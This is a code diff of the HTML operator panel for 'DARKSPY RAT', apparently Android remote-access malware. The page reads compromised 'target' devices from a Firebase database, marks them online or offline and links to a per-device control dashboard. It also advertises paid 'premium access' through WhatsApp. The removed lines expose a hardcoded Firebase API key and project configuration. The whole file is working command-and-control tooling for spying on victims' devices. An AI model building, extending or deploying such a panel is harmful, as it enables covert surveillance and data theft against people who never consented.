@@ -2,99 +2,226 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>DarkSpy v1.0 - DARK MASTER</title>
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>darkspy.dark.of.master</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        :root { --red: #ff0000; --bg: #000; --green: #00ff41; }
-        body { background: var(--bg); color: var(--green); font-family: 'Courier New', monospace; margin: 0; overflow: hidden; }
-        #dots-canvas { position: fixed; top: 0; left: 0; z-index: -1; width: 100%; height: 100%; opacity: 0.7; }
-        
-        .header { border-bottom: 2px solid var(--red); padding: 10px 20px; display: flex; justify-content: space-between; align-items: center; background: rgba(0,0,0,0.9); }
-        .main-layout { display: flex; flex-direction: column; align-items: center; padding: 30px 15px; position: relative; z-index: 1; }
-        
-        .branding img { width: 100px; border: 2px solid var(--red); border-radius: 50%; padding: 5px; box-shadow: 0 0 20px red; margin-bottom: 10px; }
-        .branding h1 { color: var(--red); letter-spacing: 5px; font-size: 24px; text-shadow: 0 0 10px red; margin-bottom: 20px; font-weight: 900; }
+        :root { --red: #ff0000; --bg: #000; --green: #00ff41; --panel: rgba(10, 10, 10, 0.95); }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Courier New', monospace; }
+        body { background: var(--bg); color: var(--green); overflow-x: hidden; }
+        #bg-canvas { position: fixed; top: 0; left: 0; z-index: -1; width: 100%; height: 100%; opacity: 0.6; }
 
-        .scan-container { width: 100%; max-width: 500px; background: rgba(15, 0, 0, 0.9); border: 2px solid var(--red); padding: 20px; min-height: 200px; }
-        .scan-line { font-size: 14px; font-weight: 900; margin-bottom: 10px; border-left: 4px solid var(--red); padding-left: 12px; color: var(--green); }
+        /* Header (Same as provided DarkSpy) */
+        .header { border-bottom: 2px solid var(--red); padding: 10px 20px; display: flex; justify-content: space-between; align-items: center; background: #000; position: sticky; top: 0; z-index: 100; box-shadow: 0 0 15px rgba(255,0,0,0.5); }
+        .branding img { width: 30px; }
+        .branding span { color: var(--red); font-weight: bold; font-size: 18px; text-shadow: 0 0 10px var(--red); }
 
-        .victim-card { border: 2px solid var(--red); background: rgba(20,0,0,0.85); padding: 15px; margin-bottom: 15px; display: flex; justify-content: space-between; align-items: center; cursor: pointer; transition: 0.3s; width: 100%; max-width: 500px; }
-        .victim-card:hover { background: var(--red); color: #000; transform: scale(1.03); }
+        /* Main Layout */
+        .main-layout { padding: 30px 20px; text-align: center; max-width: 800px; margin: auto; position: relative; z-index: 1; }
+        .branding-large { margin-bottom: 30px; }
+        .branding-large img { width: 120px; border-radius: 50%; border: 3px solid var(--red); box-shadow: 0 0 25px var(--red); }
+        .branding-large h1 { color: var(--red); font-size: 28px; letter-spacing: 5px; margin-top: 15px; font-weight: 900; text-shadow: 0 0 10px var(--red); }
+
+        /* Panels (Merged Howler config with DarkSpy look) */
+        .panel { background: rgba(15, 0, 0, 0.9); border: 2px solid var(--red); border-radius: 5px; padding: 25px; margin-bottom: 25px; min-height: 200px; text-align: left; position: relative;}
+        .panel::after { content: "MASTER_CONFIG"; position: absolute; top: -10px; left: 15px; background: #000; color: var(--red); padding: 0 5px; font-size: 11px; font-weight: bold;}
+        
+        /* Inputs (Merged VIP style) */
+        input { width: 100%; padding: 12px; margin: 10px 0; background: #000; color: var(--green); border: 1px dashed var(--red); outline: none; font-size: 13px; }
+        input:focus { border-style: solid; box-shadow: 0 0 10px rgba(255,0,0,0.5); }
+        
+        .btn-red { background: var(--red); color: white; border: none; padding: 12px 20px; cursor: pointer; font-weight: bold; width: 100%; text-transform: uppercase; letter-spacing: 2px; transition: 0.3s; margin-bottom: 10px; }
+        .btn-red:hover { box-shadow: 0 0 25px var(--red); transform: translateY(-1px); }
+
+        /* New Premium Button Style */
+        .btn-premium { background: transparent; color: #fff; border: 1.5px solid #fff; padding: 12px 20px; cursor: pointer; font-weight: bold; width: 100%; text-transform: uppercase; letter-spacing: 2px; transition: 0.3s; text-decoration: none; display: block; text-align: center; font-size: 13px; }
+        .btn-premium:hover { background: #fff; color: #000; box-shadow: 0 0 20px #fff; }
+
+        /* Scanning Logic from DarkSpy (Visual only) */
+        .scan-panel { background: rgba(15, 0, 0, 0.9); border: 2px solid var(--red); border-radius: 5px; padding: 25px; margin-bottom: 25px; min-height: 250px; text-align: left; position: relative;}
+        .scan-panel::after { content: "MASTER NODE"; position: absolute; top: -10px; left: 15px; background: #000; color: var(--red); padding: 0 5px; font-size: 11px; font-weight: bold;}
+        .scan-line { font-size: 14px; font-weight: 900; margin-bottom: 12px; border-left: 4px solid var(--red); padding-left: 12px; }
+
+        /* Device Cards (Same look as provided DarkSpy) */
+        #victim-list { display: flex; flex-direction: column; gap: 15px; margin-top: 20px; }
+        .dv-card { background: rgba(20, 0, 0, 0.85); border: 2px solid var(--red); padding: 20px; cursor: pointer; display: flex; align-items: center; justify-content: space-between; transition: 0.3s; width: 100%; position: relative; }
+        .dv-card:hover { background: var(--red); color: #000; box-shadow: 0 0 15px var(--red); transform: translateY(-2px); }
         .v-info { display: flex; align-items: center; gap: 15px; }
-        .v-info img { width: 50px; height: 50px; border-radius: 50%; border: 2px solid var(--red); }
-        .v-info b { font-size: 18px; letter-spacing: 1px; font-weight: 900; }
-        .status { color: var(--green); font-size: 12px; font-weight: 900; animation: blink 0.8s infinite; }
+        .v-info img { width: 60px; height: 60px; border-radius: 50%; border: 2px solid var(--red); }
+        .v-name { font-size: 18px; font-weight: 900; letter-spacing: 1px; color: #fff; }
+        .dv-card:hover .v-name { color: #000; }
+        .v-id { font-size: 11px; color: rgba(255, 0, 0, 0.8); margin-top: 3px; }
+        .dv-card:hover .v-id { color: #222; }
+        .status { color: var(--green); font-size: 12px; font-weight: bold; animation: blink 1s infinite; }
+        .dv-card:hover .status { color: #000; }
         @keyframes blink { 50% { opacity: 0; } }
+
+        ::-webkit-scrollbar { width: 4px; }
+        ::-webkit-scrollbar-thumb { background: var(--red); }
+        
+        .empty { text-align: center; color: #555; padding: 30px; font-size: 12px; }
+        #toast { position: fixed; bottom: 24px; right: 24px; background: rgba(0,0,0,0.9); border: 1px solid var(--red); color: #fff; padding: 12px 20px; border-radius: 2px; font-size: 13px; transform: translateY(60px); opacity: 0; transition: all .3s; z-index: 9999; }
+        #toast.show { transform: translateY(0); opacity: 1; }
     </style>
 </head>
 <body>
-    <canvas id="dots-canvas"></canvas>
+    <canvas id="bg-canvas"></canvas>
+    
     <div class="header">
-        <div style="display:flex; align-items:center; gap:10px;">
-            <img src="https://i.postimg.cc/RCYbwpF3/favicon.png" width="25">
-            <span style="color:var(--red); font-weight:bold; font-size:16px;">DARKSPY <span style="color:white">V1.0</span></span>
+        <div class="branding">
+            <img src="https://i.postimg.cc/RCYbwpF3/favicon.png">
+            <span>𝗗𝗔𝗥𝗞𝗦𝗣𝗬 <span style="color:white">𝗥𝗔𝗧</span></span>
         </div>
-        <span style="color:red; font-size:12px; font-weight:bold;">SERVER: ONLINE</span>
+        <div style="font-size:11px; color:white; background:var(--red); padding: 3px 8px; border-radius:2px; font-weight:bold;">SYSTEM_MODE: SCANNING</div>
     </div>
 
     <div class="main-layout">
-        <div class="branding">
+        <div class="branding-large">
             <img src="https://i.postimg.cc/htJrxvX0/Screenshot-20260205-060223.png">
-            <h1>DARK OF MASTER TERMINAL</h1>
+            <h1>MASTER TERMINAL</h1>
+            <p style="color:#555; font-size:12px; margin-top:5px;">[ ESTABLISHING CONNECTION TO DARK DEVICES ]</p>
         </div>
 
-        <div class="scan-container" id="scanner">
-            </div>
+        <div class="scan-panel" id="scanner"></div>
 
-        <div id="victim-list" style="display:none; width:100%; flex-direction: column; align-items: center;">
+        <div class="panel" id="config-panel" style="display:none;">
+            <div style="color:var(--red); font-size:12px; margin-bottom:10px;">>_ INPUT_CONFIG:</div>
+            <input id="cfgUrl" placeholder="FIREBASE_DATABASE_URL">
+            <input id="cfgToken" placeholder="AUTH_TOKEN_KEY (OPTIONAL)">
+            <button class="btn-red" onclick="saveConfig()">Establish Connection</button>
+            
+            <a href="https://wa.me/923268801224?text=DARKSPY%20RAT%20ACCESS%20NEED" target="_blank" class="btn-premium">
+                <i class="fab fa-whatsapp"></i> Get Premium Access
+            </a>
+        </div>
+
+        <div class="panel" id="devices-panel" style="display:none; min-height: 250px;">
+            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px;">
+                <div style="color:var(--red); font-size:12px;">>_ TARGET_NODES_IDENTIFIED:</div>
+                <div id="devCount" style="color:#555; font-size:11px;"></div>
             </div>
+            <input id="devSearch" placeholder="SEARCH_ID_OR_MODEL..." oninput="loadDevices()" style="margin-bottom:15px;">
+            <div id="victim-list"><div class="empty">Waiting for database...</div></div>
+        </div>
     </div>
 
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
-    <script>
-        const firebaseConfig = { apiKey: "AIzaSyA5-E06ArKA7Unf-fHtCflOEwu2p8VM9kI", authDomain: "dark-5b7c9.firebaseapp.com", databaseURL: "https://dark-5b7c9-default-rtdb.firebaseio.com", projectId: "dark-5b7c9", storageBucket: "dark-5b7c9.firebasestorage.app", messagingSenderId: "1029612020880", appId: "1:1029612020880:web:1d2d6f3ee96af0cf06a415" };
-        firebase.initializeApp(firebaseConfig);
-        const db = firebase.database();
+    <div id="toast"></div>
 
-        // Matrix Animation
-        const canvas = document.getElementById('dots-canvas'); const ctx = canvas.getContext('2d');
-        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-        let dots = Array(120).fill().map(() => ({ x: Math.random()*canvas.width, y: Math.random()*canvas.height, r: 1.5, s: 0.8 }));
-        function animate() { ctx.fillStyle = "rgba(0,0,0,0.2)"; ctx.fillRect(0,0,canvas.width, canvas.height); ctx.fillStyle = "rgba(255,0,0,0.6)"; dots.forEach(d => { ctx.beginPath(); ctx.arc(d.x, d.y, d.r, 0, Math.PI*2); ctx.fill(); d.y += d.s; if(d.y > canvas.height) d.y = 0; }); requestAnimationFrame(animate); }
+    <script>
+        // Matrix Canvas Animation
+        const canvas = document.getElementById('bg-canvas');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        let dots = Array(120).fill().map(() => ({
+            x: Math.random() * canvas.width,
+            y: Math.random() * canvas.height,
+            r: 1.5,
+            s: 0.8
+        }));
+        function animate() {
+            ctx.fillStyle = "rgba(0,0,0,0.15)";
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = "rgba(255,0,0,0.6)";
+            dots.forEach(d => {
+                ctx.beginPath(); ctx.arc(d.x, d.y, d.r, 0, Math.PI * 2); ctx.fill();
+                d.y += d.s; if (d.y > canvas.height) d.y = 0;
+            });
+            requestAnimationFrame(animate);
+        }
         animate();
 
-        // Scanning Logic
+        var DB_URL = localStorage.getItem("fb_url") || "";
+        var DB_TOKEN = localStorage.getItem("fb_token") || "";
+
         const scn = document.getElementById('scanner');
-        let lines = [">_ Handshaking...", ">_ Bypassing Firewalls...", ">_ Found Payloads...", ">_ Decrypting IDs...", ">_ ACCESS GRANTED!"];
+        let lines = [">_ INITIALIZING HACKER SUITE...", ">_ ESTABLISHING DB CONNECTION...", ">_ SYNCING PATHS...", ">_ FOUND ACTIVE NODES...", ">_ ACCESS GRANTED!"];
         let lIdx = 0;
         function typeScan() {
-            if(lIdx < lines.length) {
-                let d = document.createElement('div'); d.className = "scan-line"; d.innerText = lines[lIdx];
-                scn.appendChild(d); lIdx++; setTimeout(typeScan, 500);
+            if (lIdx < lines.length) {
+                let d = document.createElement('div');
+                d.className = "scan-line";
+                d.innerText = lines[lIdx];
+                scn.appendChild(d);
+                lIdx++;
+                setTimeout(typeScan, 700);
             } else {
-                setTimeout(() => { scn.style.display = 'none'; loadList(); }, 800);
+                setTimeout(() => {
+                    scn.style.display = 'none';
+                    document.getElementById('config-panel').style.display = 'block';
+                    document.getElementById('devices-panel').style.display = 'block';
+                    if(DB_URL) {
+                        document.getElementById("cfgUrl").value = DB_URL;
+                        document.getElementById("cfgToken").value = DB_TOKEN;
+                        loadDevices();
+                    }
+                }, 1000);
             }
         }
         typeScan();
 
-        function loadList() {
-            const list = document.getElementById('victim-list'); list.style.display = 'flex';
-            db.ref('online/onlinetheoneandonly').on('value', snap => {
+        function saveConfig() {
+            var url = document.getElementById("cfgUrl").value.trim().replace(/\/$/,"");
+            var token = document.getElementById("cfgToken").value.trim();
+            if(!url) { showToast("⚠️ URL REQUIRED!"); return; }
+            localStorage.setItem("fb_url", url);
+            localStorage.setItem("fb_token", token);
+            DB_URL = url; DB_TOKEN = token;
+            showToast("✅ CONNECTION ESTABLISHED!");
+            loadDevices();
+        }
+
+        function loadDevices() {
+            if(!DB_URL) return;
+            var list = document.getElementById("victim-list");
+            var search = document.getElementById("devSearch").value.toLowerCase();
+            list.innerHTML = "<div class='empty'>⏳ SCANNING DATABASE...</div>";
+
+            fetch(DB_URL + "/devices.json" + (DB_TOKEN ? "?auth="+DB_TOKEN : ""))
+            .then(r => r.json())
+            .then(data => {
                 list.innerHTML = "";
-                const data = snap.val();
-                if(!data) return;
-                Object.keys(data).forEach(id => {
+                if(!data || data === "null") {
+                    list.innerHTML = "<div class='empty' style='color:red;'>[!] NO NODES FOUND</div>";
+                    document.getElementById("devCount").innerText = "";
+                    return;
+                }
+
+                var keys = Object.keys(data);
+                var shown = 0;
+                keys.forEach(id => {
+                    var d = data[id];
+                    var st = d.status || {};
+                    var modelName = st.device_model || id;
+                    
+                    if(search && !modelName.toLowerCase().includes(search) && !id.toLowerCase().includes(search)) return;
+                    
+                    shown++;
+                    var online = st.online && (Date.now() - (st.last_seen || 0)) < 40000;
+                    
                     list.innerHTML += `
-                        <div class="victim-card" onclick="location.href='dashboard.html?id=${id}'">
+                        <div class="dv-card" onclick="location.href='dashboard.html?id=${id}'">
                             <div class="v-info">
                                 <img src="https://i.postimg.cc/htJrxvX0/Screenshot-20260205-060223.png">
-                                <b>${id}</b>
+                                <div>
+                                    <b class="v-name">${modelName.toUpperCase()}</b>
+                                    <p class="v-id">${id}</p>
+                                </div>
                             </div>
-                            <span class="status">[ ONLINE ]</span>
+                            <span class="status">[ ${online ? 'ONLINE' : 'OFFLINE'} ]</span>
                         </div>`;
                 });
+                document.getElementById("devCount").innerText = shown + " TARGETS";
+            })
+            .catch(e => {
+                list.innerHTML = "<div class='empty' style='color:red;'>[!] ERR: CONNECTION FAILED</div>";
             });
+        }
+
+        function showToast(m) {
+            var t = document.getElementById("toast");
+            t.innerText = m; t.classList.add("show");
+            setTimeout(() => t.classList.remove("show"), 3000);
         }
     </script>
 </body>
